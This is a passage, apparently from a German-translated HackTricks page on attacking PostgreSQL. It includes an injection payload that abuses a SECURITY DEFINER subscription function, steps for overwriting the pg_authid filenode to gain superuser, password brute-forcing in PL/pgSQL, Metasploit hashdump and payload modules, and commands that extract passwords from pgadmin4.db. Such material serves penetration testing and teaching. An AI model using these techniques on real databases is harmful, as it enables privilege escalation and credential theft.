subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) wird eine Funktion mit **SECURITY DEFINER** mit den Rechten des **Benutzers, dem sie gehört**, ausgeführt. Daher kann eine Funktion, die **anfällig für SQL Injection** ist oder **privilegierte Aktionen mit Parametern ausführt, die vom Angreifer kontrolliert werden**, missbraucht werden, um **Privilegien innerhalb von postgres zu eskalieren**.

In Zeile 4 des vorherigen Codes können Sie sehen, dass die Funktion das **SECURITY DEFINER**-Flag hat.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce mit PL/pgSQL

**PL/pgSQL** ist eine **vollwertige Programmiersprache**, die im Vergleich zu SQL eine größere prozedurale Kontrolle bietet. Sie ermöglicht die Nutzung von **Schleifen** und anderen **Kontrollstrukturen**, um die Programmlogik zu erweitern. Zusätzlich können **SQL statements** und **triggers** Funktionen aufrufen, die mit der **PL/pgSQL language** erstellt wurden. Diese Integration erlaubt einen umfassenderen und vielseitigeren Ansatz für Datenbankprogrammierung und Automatisierung.\
**You can abuse this language in order to ask PostgreSQL to brute-force the users credentials.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Der folgende privesc-Vektor ist besonders nützlich in eingeschränkten SQLi-Kontexten, da alle Schritte durch verschachtelte SELECT statements ausgeführt werden können

Wenn Sie PostgreSQL-Serverdateien lesen und schreiben können, können Sie ein Superuser werden, indem Sie die PostgreSQL-On-Disk-Filenode überschreiben, die mit der internen `pg_authid`-Tabelle verknüpft ist.

Read more about **this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Ermitteln Sie das PostgreSQL data directory
2. Ermitteln Sie einen relativen Pfad zur filenode, die mit der Tabelle `pg_authid` verknüpft ist
3. Laden Sie die filenode über die `lo_*` functions herunter
4. Ermitteln Sie den Datentyp, der mit der Tabelle `pg_authid` verknüpft ist
5. Verwenden Sie den [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); setzen Sie alle `rol*` boolean flags auf 1 für volle Berechtigungen.
6. Laden Sie die bearbeitete filenode erneut über die `lo_*` functions hoch und überschreiben Sie die Originaldatei auf der Festplatte
7. _(Optionally)_ Leeren Sie den In-Memory-Tabellen-Cache, indem Sie eine aufwändige SQL query ausführen
8. Sie sollten nun die Privilegien eines vollständigen Superadmins haben.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### Protokollierung

In der Datei _**postgresql.conf**_ können Sie die postgresql-Logs aktivieren, indem Sie Folgendes ändern:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Dann, **starten Sie den Dienst neu**.

### pgadmin

[pgadmin](https://www.pgadmin.org) ist eine Verwaltungs- und Entwicklungsplattform für PostgreSQL.\
Sie finden **passwords** in der _**pgadmin4.db**_ Datei\
Sie können diese mit der _**decrypt**_ Funktion im Skript entschlüsseln: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Die Client-Authentifizierung in PostgreSQL wird über eine Konfigurationsdatei namens **pg_hba.conf** verwaltet. Diese Datei enthält eine Reihe von Einträgen, die jeweils einen Verbindungstyp, einen Client-IP-Adressbereich (falls zutreffend), den Datenbanknamen, den Benutzernamen und die für die Übereinstimmungsprüfung der Verbindungen zu verwendende Authentifizierungsmethode angeben. Der erste Eintrag, der auf Verbindungstyp, Client-Adresse, angeforderte Datenbank und Benutzernamen zutrifft, wird für die Authentifizierung verwendet. Es gibt keine Fallback- oder Backup-Option, wenn die Authentifizierung fehlschlägt. Trifft kein Eintrag zu, wird der Zugriff verweigert.

Die in pg_hba.conf verfügbaren passwortbasierten Authentifizierungsmethoden sind **md5**, **crypt** und **password**. Diese Methoden unterscheiden sich darin, wie das Passwort übertragen wird: MD5-gehasht, mit crypt verschlüsselt oder im Klartext. Es ist wichtig zu beachten, dass die crypt-Methode nicht mit Passwörtern verwendet werden kann, die in pg_authid verschlüsselt wurden.

## Referenzen

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
